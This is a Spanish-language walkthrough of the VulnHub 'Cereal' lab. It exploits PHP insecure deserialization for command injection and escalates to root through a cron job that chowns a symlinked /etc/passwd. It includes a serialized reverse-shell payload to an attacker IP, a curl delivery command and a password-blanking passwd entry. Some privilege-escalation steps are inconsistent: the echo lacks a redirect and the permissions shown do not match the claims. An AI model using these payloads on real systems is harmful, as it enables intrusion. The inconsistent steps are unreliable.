---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/cereal
dificultad: Media
os: Linux
relacionados:
  - "[[Serialización]]"
  - "[[Deserialización]]"
  - "[[Remote Code Execution]]"
  - "[[OS Command Injection]]"
  - "[[Virtual Hosting]]"
  - "[[Symbolic Link Exploitation]]"
  - "[[pspy]]"
  - "[[Enumeración Web]]"
---
#  VulnHub - Cereal

## Reconocimiento  

Inicio con un escaneo de red exhaustivo para identificar hosts activos:  
```bash
sudo netdiscover -i <interfaz> -r <rango_de_red>
```  
Tras identificar el objetivo, realizo un escaneo profundo de puertos:  
```bash
sudo nmap -v -T4 -A -p- -oN nmap.log <IP_objetivo>
```  

**Resultados clave de Nmap**:  
- **21/tcp (FTP):** `vsftpd 3.0.3` con acceso anónimo habilitado.  
- **22/tcp (SSH):** `OpenSSH 8.0` (posible vector si encontramos credenciales).  
- **80/tcp (HTTP):** Servidor `Apache httpd 2.4.37` mostrando página predeterminada.  
- **44441/tcp (HTTP):** Segundo servidor `Apache httpd 2.4.37` con mensaje "coming soon".  
- **139/445 (SMB):** Servicios de archivos Windows (enumera compartidos).  
- **3306/tcp (MySQL/MariaDB):** Servicio de base de datos expuesto.  
- **Otros puertos altos:** Servicios no identificados que requieren investigación.  

La presencia de FTP anónimo y múltiples servidores web sugirió priorizar la enumeración web y búsqueda de credenciales.  


---

## Análisis de Vulnerabilidades  

### Enumeración Web Inicial  

En el puerto 80, uso `ffuf` para descubrir rutas ocultas:  
```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://<IP_objetivo>/FUZZ \
     -D -e .html,.bak,.php,.txt -o dirscan
```  

**Hallazgos relevantes**:  
- `/admin`: Directorio con panel de login potencial.  
- `/blog`: Sitio WordPress que reveló el virtual host `cereal.ctf`.  

**Configuración esencial en `/etc/hosts`**:  
```  
<IP_objetivo> cereal.ctf
```  

### Descubrimiento de Virtual Hosts Crítico  

El puerto 44441 inicialmente mostraba un mensaje genérico "coming soon". Realizo enumeración de hosts virtuales con:  
```bash
gobuster vhost -u http://cereal.ctf:44441 \
               --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
               -o vhost
```  
**Hallazgo fundamental**: Virtual host `secure.cereal.ctf` que al acceder muestra una funcionalidad de "ping".  

**Nueva configuración en `/etc/hosts`**:  
```  
<IP_objetivo> cereal.ctf secure.cereal.ctf
```  

### Vulnerabilidad de Deserialización Insegura  

Al inspeccionar la funcionalidad de ping:  
- El parámetro `obj` contenía datos serializados:  
  ```php
  O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}
  ```  
- Intentos de inyección directa de comandos fallaron.  

**Descubrimiento del código fuente**:  
Realizo enumeración intensiva en `secure.cereal.ctf:44441`:  
```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
     -u http://secure.cereal.ctf:44441/FUZZ \
     -D -e .bak,.txt -of html -o dir-secure.html
```  

Encuentro `index.php.bak` con el código vulnerable:  
```php
class pingTest {
    public $ipAddress;
    public $isValid = False;
    public $output;

    public function __construct() {
        if(isset($_POST['obj'])) {
            $obj = unserialize($_POST['obj']);
            $obj->validate(); // ¡Deserialización controlada por el usuario!
        }
    }

    public function validate() {
        if ($this->isValid) { // Variable controlable
            $this->ping(); // Función peligrosa
        }
    }

    public function ping() {
        // Ejecución directa sin sanitización
        $this->output = shell_exec("ping -c 3 " . $this->ipAddress);
    }
}
```  
El análisis del código reveló que si `$isValid` es `True`, se llama directamente al método `ping()`, que utiliza `shell_exec()` con la dirección IP proporcionada. Aquí reside el vector de inyección de comandos.

**Vector de explotación**:  
1. Crear objeto `pingTest` con `$isValid = True`.  
2. Inyectar comandos en `$ipAddress`.  
3. Serializar el objeto y enviarlo via POST.  

---

## Explotación  de Vulnerabilidades

### Construcción de Payload de Deserialización  

Creo un script PHP (`exploit.php`) para generar el payload:  
```php
<?php
class pingTest {
    public $ipAddress = " ; bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'";
    public $isValid = True;
    public $output;
}
echo urlencode(serialize(new pingTest));
?>
```  

**Generación y envío del payload**:  
```bash
# Generar payload serializado
php exploit.php > payload.txt

# Enviar via curl
curl -X POST http://secure.cereal.ctf:44441/index.php \
     -d "obj=$(cat payload.txt)"
```  

**Preparo el listener**:  
```bash
nc -nlvp 443
```  
**Resultado**: Obtengo una shell reversa como usuario `apache`.  


---

## Escalada de Privilegios  

### Enumeración del Sistema  

Identifico usuarios válidos:  
```bash
cat /etc/passwd | grep /bin/bash
# rocky:x:1000:1000::/home/rocky:/bin/bash
```  

Uso `pspy` para monitorear procesos:  
```bash
./pspy64 -i 100ms -p
```  

**Hallazgo crítico en logs**:  
```log
2025/06/09 12:05:01 CMD: UID=0    PID=1000   | /bin/sh -c /usr/share/scripts/chown.sh
```  

### Análisis del Cronjob  

Inspecciono el script automatizado:  
```bash
cat /usr/share/scripts/chown.sh
```
```bash
#!/bin/bash
chown -R rocky:apache /home/rocky/public_html
```  
Este script cambia recursivamente el propietario de los archivos en `/home/rocky/public_html` a `rocky:apache`. Dado que el usuario `apache` tiene permisos de escritura en este directorio, se puede explotar esto mediante un _symlink_.

**Permisos del directorio**:  
```bash
ls -ld /home/rocky/public_html
# drwxrwxr-x. 2 rocky apache 4096 Jun 9 11:00 public_html
```  
El usuario `apache` tiene permisos de escritura gracias al grupo `apache`.  

### Explotación mediante Symbolic Link  

Creo un enlace simbólico a `/etc/passwd`:  
```bash
ln -s /etc/passwd /home/rocky/public_html/passwd
```  

Espero 1-5 minutos a que el cronjob se ejecute:  
```bash
watch -n 5 ls -l /etc/passwd
```  

**Después de la ejecución**:  
```bash
ls -l /etc/passwd
# -rw-r--r--. 1 rocky apache 2100 Jun 9 12:10 /etc/passwd
```  
Ahora el grupo `apache` tiene permisos de escritura.  

### Modificación de /etc/passwd  

Modifico el usuario root y lo dejo sin contraseña:  
```bash
echo 'root::0:0:root:/root:/bin/bash'
```  

Accedo como root:  
```bash
su root
# ¡Acceso concedido sin contraseña!
```  


___

## Bandera(s)

> [!flag] `flag{user}`
> aaa87365bf3dc0c1a82aa14b4ce26bbc
^bandera-user

> [!flag] `flag{root}`
> 1aeb5db4e979543cb807cfd90df77763
^bandera-root




